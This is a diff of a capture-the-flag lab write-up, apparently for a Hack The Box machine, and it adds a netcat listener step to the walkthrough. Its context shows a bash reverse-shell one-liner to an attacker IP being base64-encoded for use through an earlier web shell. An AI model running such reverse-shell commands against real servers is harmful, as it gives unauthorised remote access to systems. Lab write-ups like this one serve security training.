@@ -995,20 +995,33 @@ The web shell is alive and executing commands on the server as `www-data` — 
 To summarise what just happened:
 
 ![[Web Shell Execution Flow.png]]
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 3.3
+
+```
+┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
+└─$ nc -lvnp 80  
+listening on [any] 80 ...
+
+```
 
 
+```
 ┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
 └─$ echo 'bash -i >& /dev/tcp/10.10.15.227/80 0>&1' | base64 -w0
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjcvODAgMD4mMQo=                                                                            
 ┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
 └─$ 
-
-
-
-
-
 ```
-```
+
 
 <div align="center">
 <br>
